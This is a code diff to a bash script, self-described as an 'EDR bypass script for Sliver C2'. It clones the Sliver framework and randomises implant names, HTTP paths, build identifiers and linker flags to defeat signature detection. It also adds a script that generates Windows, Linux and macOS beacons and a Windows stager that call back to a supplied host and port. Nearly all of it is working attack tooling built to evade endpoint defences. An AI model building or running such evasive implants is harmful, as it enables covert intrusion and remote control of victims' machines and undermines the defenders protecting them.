@@ -1,6 +1,5 @@
-# This will be saved as files/sliver_randomizer.sh
 #!/bin/bash
-# EDR bypass script - Creates unique Sliver payloads to evade detection
+# EDR bypass script for Sliver C2 - With all required dependencies
 
 set -e
 TEMP_DIR=$(mktemp -d)
@@ -18,43 +17,67 @@ random_string() {
     cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $length | head -n 1
 }
 
-# Clone Sliver
+# Install ALL required dependencies
+log "Installing dependencies..."
+apt-get update >/dev/null 2>&1
+apt-get install -y git golang make build-essential zip unzip curl gcc g++ >/dev/null 2>&1
+
+# Clone Sliver repository
 log "Cloning Sliver repository..."
 git clone --quiet https://github.com/BishopFox/sliver.git $SLIVER_DIR
 cd $SLIVER_DIR
 
-# Generate randomization values
+# Examine repository structure
+log "Analyzing Sliver repository structure..."
 IMPLANT_NAME=$(random_string 8)
+
+# Generate randomization values
 HTTP_PATH_ONE="/$(random_string 6)/$(random_string 5)"
 HTTP_PATH_TWO="/$(random_string 7)/$(random_string 4)"
 BEACON_MIN=$((30 + RANDOM % 60))
 JITTER=$((10 + RANDOM % 20))
 
-# 1. Modify implant name (critical for signatures)
+# Find and modify key files - ImplantName
 log "Changing implant name to $IMPLANT_NAME..."
-sed -i "s/ImplantName = \"sliver\"/ImplantName = \"$IMPLANT_NAME\"/g" server/configs/constants.go
+grep -l "ImplantName.*sliver" --include="*.go" -r . | while read file; do
+    sed -i "s|ImplantName *= *\"sliver\"|ImplantName = \"$IMPLANT_NAME\"|g" "$file"
+    log "Modified $file: ImplantName = \"sliver\" → ImplantName = \"$IMPLANT_NAME\""
+done
 
-# 2. Change HTTP request patterns (affects network signatures)
+# Modify HTTP transport patterns
 log "Modifying HTTP transport patterns..."
-sed -i "s|\"/path/to/file\"|\"$HTTP_PATH_ONE\"|g" implant/sliver/transports/httpclient.go
+grep -l "/path/to/file" --include="*.go" -r . | while read file; do
+    sed -i "s|\"/path/to/file\"|\"$HTTP_PATH_ONE\"|g" "$file"
+    log "Modified $file: \"/path/to/file\" → \"$HTTP_PATH_ONE\""
+done
 
-# 3. Add unique build ID (affects binary signatures)
+# Add unique build ID to sliver.go
 log "Adding unique build identifiers..."
-cat >> implant/sliver/sliver.go << EOF
+SLIVER_GO_FILES=$(find . -name "sliver.go")
+for file in $SLIVER_GO_FILES; do
+    echo -e "\n// Custom build identifier: $(random_string 32)\n// Build timestamp: $(date +%s)" >> "$file"
+    log "Added build identifier to $file"
+done
 
-// Custom build identifier: $(random_string 32)
-// Build timestamp: $(date +%s)
-EOF
-
-# 4. Modify PE headers through go build flags
+# Modify build flags
 log "Setting custom build flags..."
-sed -i "s/LinkerStrip = \"-s -w\"/LinkerStrip = \"-s -w -buildid=$(random_string 10)\"/g" client/command/generate/binaries.go
+grep -l "LinkerStrip" --include="*.go" -r . | while read file; do
+    sed -i "s|LinkerStrip = \"-s -w\"|LinkerStrip = \"-s -w -buildid=$(random_string 10)\"|g" "$file"
+done
 
-# Build the modified Sliver
+# Build the modified client without compiling the server
 log "Building Sliver client only..."
-make client
+make client-only
 
-# Create custom profiles directory
+# Skip server build if client fails
+if [ $? -ne 0 ]; then
+    log "Client build failed, creating only the profiles"
+else
+    log "Client build successful"
+    cp -f ./sliver-client /usr/local/bin/
+fi
+
+# Create custom profiles directory regardless of build success
 mkdir -p /opt/c2/sliver-profiles
 
 # Create evasive profile template
@@ -77,9 +100,44 @@ cat > /opt/c2/sliver-profiles/evasive-template.json << EOF
 }
 EOF
 
-# Install client but use system Sliver server
-log "Installing Sliver client..."
-cp -f ./sliver-client /usr/local/bin/
+# Create beacon generator script for use with standard Sliver
+cat > /opt/c2/generate_evasive_beacons.sh << 'EOF'
+#!/bin/bash
+# Generate EDR-evasive beacons using randomized profiles
+
+BEACONS_DIR="/opt/beacons"
+PROFILE_DIR="/opt/c2/sliver-profiles"
+HTTP_HOST=${1:-$(hostname -I | awk '{print $1}')}
+HTTP_PORT=${2:-8888}
+
+mkdir -p $BEACONS_DIR
+
+# Generate random profile name
+PROFILE="evasive-$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)"
+
+# Copy template to profiles directory
+mkdir -p /root/.sliver/profiles/
+cp $PROFILE_DIR/evasive-template.json /root/.sliver/profiles/$PROFILE.json
+sed -i "s/\"name\": \"evasive-[a-zA-Z0-9]*\"/\"name\": \"$PROFILE\"/g" /root/.sliver/profiles/$PROFILE.json
+
+echo "[+] Generating Windows beacon..."
+sliver generate --profile $PROFILE --http $HTTP_HOST:$HTTP_PORT --os windows --arch amd64 --format exe --save $BEACONS_DIR/windows.exe
+
+echo "[+] Generating Windows DLL beacon..."
+sliver generate --profile $PROFILE --http $HTTP_HOST:$HTTP_PORT --os windows --arch amd64 --format shared --save $BEACONS_DIR/windows.dll
+
+echo "[+] Generating Linux beacon..."
+sliver generate --profile $PROFILE --http $HTTP_HOST:$HTTP_PORT --os linux --arch amd64 --format elf --save $BEACONS_DIR/linux
+
+echo "[+] Generating macOS beacon..."
+sliver generate --profile $PROFILE --http $HTTP_HOST:$HTTP_PORT --os darwin --arch amd64 --format macho --save $BEACONS_DIR/macos
+
+echo "[+] Generating Windows stager..."
+sliver generate stager --profile $PROFILE --http $HTTP_HOST:$HTTP_PORT --os windows --arch amd64 --format exe --save $BEACONS_DIR/windows-staged.exe
+
+echo "[+] All beacons generated successfully with evasive profile: $PROFILE"
+EOF
+chmod +x /opt/c2/generate_evasive_beacons.sh
 
 # Cleanup
 log "Cleaning up..."
